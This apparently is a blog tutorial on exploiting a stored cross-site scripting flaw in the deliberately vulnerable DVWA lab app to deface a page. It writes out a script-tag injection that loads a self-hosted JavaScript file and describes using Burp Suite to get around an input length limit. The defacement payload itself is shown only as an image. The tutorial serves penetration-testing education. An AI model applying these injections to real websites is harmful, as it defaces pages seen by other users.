---
title: How a Hacker Can Deface a Website 1
date: 2024-06-20 12:00:00 -500
categories: [blog, tutorial, Web Penetration Testing]
tags: [cyber, security, exploits, web]
image: /pictures/website_deface/hacker.jpg
---




# How a Hacker Can Deface a Website




# Overview


This is the first post in a tutorial series that will help showcase how trivial it can be for a hacker to exploit public-facing web applications. Throughout this series, I will lay out my thought process with hopes that it will not only be beneficial for the reader of this blog, but also for myself as I continue to learn.


All websites and applications used in these tutorials are intentionally vulnerable applications where I have permission to exploit them to my hearts' desire. Do not repeat any of the things I discuss unless you **HAVE PERMISSION**. I am not responsible for any legal issues that you may get into if you do not go about this **ethically**.




# Objectives


My objectives are the following....


- Find and exploit a simple Stored Cross-Site Script (XSS) vulnerability
- Use XSS vulnerability to run script that changes elements in web page








The vulnerable application I am testing today is the [Damn Vulnerable Web Application (DVWA)](https://github.com/digininja/DVWA). DVWA is a PHP/MySQL web application that is very vulnerable. It is a good application to get practice with as many applications in 2024 still utilize PHP and some form of a database in their stack. Instructions for how to set up the application can be found [here](https://www.youtube.com/watch?v=WkyDxNJkgQ4).


For this tutorial, we will be setting our security level to **LOW**. This is important!


# Objective 1: Find and exploit simple XXS


## Methodology


![Beginning Page](/pictures/website_deface/page.PNG)


In the beginning of any pentest we should get familiar with our target. Being that we want to specifically test for XSS, we should start thinking of ways to input a script into the app. Without getting too fancy, the first thing we can test is to see if the application will accept our text modifications. Let's add bold text in our field and see what happens. If you don't already know, we can do this by including our text in
"bold" tags like this...


```html
<b> Test Text </b>
```


![Test Input](/pictures/website_deface/input.PNG)


![Result of Test Input](/pictures/website_deface/result.PNG)


The results from our input seem very promising. The webpage accepted our text modifications! This means that we found a simple XSS. This must imply that we can run a more malicious script other than bolding text should it not? Let's find out. In the meantime we can mark this objective as complete. ✅


# Objective 2: Use XSS to change (DEFACE) website


## Disclaimer
For this goal, it would help to have basic prior knowledge of how web pages are built. We utilize the programming languages HTML, CSS, and Javascript to essentially create our web application, style it, and give its functionality.


Specifically with Javascript, we are able to change out elements in a .html file that we don't even have to access directly.


For the sake of time, I won't go into details on the logic behind this payload creation, but you are welcome to copy it and study it so that you can understand why I decided to use these specific commands.




## Methodology


Before further testing the web application, it is important to build and host a payload that we can call upon in the vulnerable web application. This process is simple.


On my system, I have a directory specifically for payloads. Create a similar directory for yourself and create a "script.js" file inside of it. Also choose an arbitrary image to use in your payload.


![show directory here](/pictures/website_deface/directory-listing.PNG)


After that it is done, get your favorite text editor and add the following lines of code..


![Payload Here](/pictures/website_deface/payload.PNG)


This code should serve as our malicious script that will ultimately deface our target website. It is important to serve this script so that we are able to access it in the web application. This can be done by running the following command in our payload directory...


```bash
python -m http.server 8000
```


This command starts a webserver on port 8000 that we can travel to and access our script. To ensure that the server is up and running correctly, travel to "localhost:8000" in your browser and we should see the files we've created/uploaded.




![directory listing](/pictures/website_deface/directory-listing.PNG)


Once we have confirmed our web server is running, we can begin constructing our input to call our script.


Normally, this can be done by utilizing a script tag to alert ourselves if the script is running. If the malicious script succeeds in being run by the browser the website should be defaced. Here's our custom input...


```js
<script src="localhost:8000/script.js">alert(1);</script>


```
Attempting to insert this into the input field we see that there seems to be a character limit, which doesn't allow us to insert our custom input. What should we do next?


It is important to stay persistent when pentesting as you may have to sometimes think outside the box to achieve your goal. One idea I had when coming across this obstacle was to utilize something that would allow me to send my own requests to the application without being bounded by a character limit. Luckily there is a program called [BurpSuite](https://portswigger.net/burp) that allows me to do just that.


Once again, I won't go into details of how to set up a BurpSuite proxy to send requests to the web application (This can be shown in another tutorial). For the purpose of this tutorial I will only show how it can be utilized to send requests to our webpage.


After setting things up properly we can directly submit a request to the input field. This is what it looks like in practice.




As you can see, the highlighted message field is where we build our custom message to send the application. This is the custom input we attempted previously, just with the special characters encoded.


After sending the request, confirm that it was successful by looking at the response sent from the web application. If you received a *200 OK*, then you should be in the clear. Let's travel back to our site to see if anything happened.


![PWNED](/pictures/website_deface/pwned.PNG)


**Boom!**


Traveling back to our site we see that we were able to successfully deface it! Now anytime a user happens to travel to the page shown above, they will be greeted with our custom payload. Looks like this objective is complete. ✅






# Key Takeaways


As you can see, it is quite trivial to deface a website that has low to no security. Some key takeaways from this tutorial are...


1. *ALWAYS* sanitize user input no matter what.
2. Test any web application you create for basic vulnerabilities such as these.
3. For security researchers, stay persistent and don't give up. Finding bugs gets easier over time.




Keep hacking 💯











